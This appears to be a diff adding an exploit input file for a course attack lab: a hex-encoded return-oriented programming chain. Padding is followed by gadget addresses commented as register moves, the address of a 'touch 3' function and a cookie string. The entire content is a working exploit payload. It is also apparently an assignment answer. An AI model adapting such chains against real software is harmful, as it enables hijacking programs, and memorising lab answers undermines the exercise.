@@ -1,0 +1,16 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d1 1a 40 00 00 00 00 00 /* move rsp to rax */
+0f 1a 40 00 00 00 00 00 /* move rax to rdi */
+31 1a 40 00 00 00 00 00 /* popq rax */
+48 00 00 00 00 00 00 00 /* gap between gadget1 and cookie */
+b0 1a 40 00 00 00 00 00 /* move eax to edx */
+f3 1a 40 00 00 00 00 00 /* move edx to ecx */
+d8 1a 40 00 00 00 00 00 /* move ecx to esi */
+48 1a 40 00 00 00 00 00 /* add rsi and rdi then move to rax */
+0f 1a 40 00 00 00 00 00 /* move rax to rdi */
+70 19 40 00 00 00 00 00 /* address of touch 3 */
+36 35 64 34 37 31 62 35 /* cookie */
